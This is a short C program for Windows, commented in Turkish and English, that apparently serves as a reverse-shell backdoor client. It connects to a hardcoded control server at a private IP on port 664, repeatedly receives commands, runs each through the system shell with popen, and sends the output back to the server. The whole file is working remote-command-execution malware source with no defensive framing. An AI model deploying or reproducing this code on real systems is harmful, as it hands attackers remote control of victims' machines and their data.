#include <stdio.h>
#include <strings.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

// shell de cmd ile dondurulen cikti
FILE *execcmd(char *cmd)
{
    FILE *fp = popen(cmd, "r");
    return fp;
}

int s_send(s, msg)
{
    return send(s, msg,strlen(msg), 0);
}

int main(int argc , char *argv[])
{
   
    const char HOST[20] = "192.168.2.120";
    const int PORT = 664;

    //our socket
    WSADATA wsa;
    SOCKET s;

    // `sockaddr_in` kontrol sunucu hakkinda bilgi toplar
    struct sockaddr_in server;

    int recv_size;

    // alacagim komut için
    const int CMD_SIZE = 2048;
    char cmd[CMD_SIZE];

    // output file from the shell
    FILE *out_fp = NULL;

    // one line of the shell output
    char out[CMD_SIZE];

    // get Winsock ready for use
    printf("\nInitializing Winsock...");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Failed: %d", WSAGetLastError());
        WSACleanup();
        return 1;
    } else {
        printf("Initialized.\n");
    }

    // create the Winsock socket
    if((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Could not create socket: %d" , WSAGetLastError());
        return 1;
    }
    printf("Socket created.\n");

    // set the our `server` host, type, and port
    server.sin_addr.s_addr = inet_addr(HOST);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    // connect to the control server
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("Connection error.");
        return 1;
    }

    puts("Connected");

    while(1)
    {
        // receive the control server's command
        if((recv_size = recv(s, cmd, CMD_SIZE, 0)) == SOCKET_ERROR)
        {
            if(s_send(s, "Last input was not received.") < 0)
            {
                puts("Send failed");
                return 1;
            }
        } else {
            // cmd karakterinin  sonuna NULL eklendi,sorunsuz calisma icin
            cmd[recv_size] = '\0';

          //  puts(cmd);

            // execute the control command in our shell
            out_fp = execcmd(cmd);

            // send each line from the command output to the control server
            while (fgets(out, CMD_SIZE, out_fp) != NULL)
            {
                if(s_send(s, out) < 0)
                {
                    puts("Send failed");
                    return 1;
                }
            }
        }
        pclose(out_fp);
    }

    return 0;
}
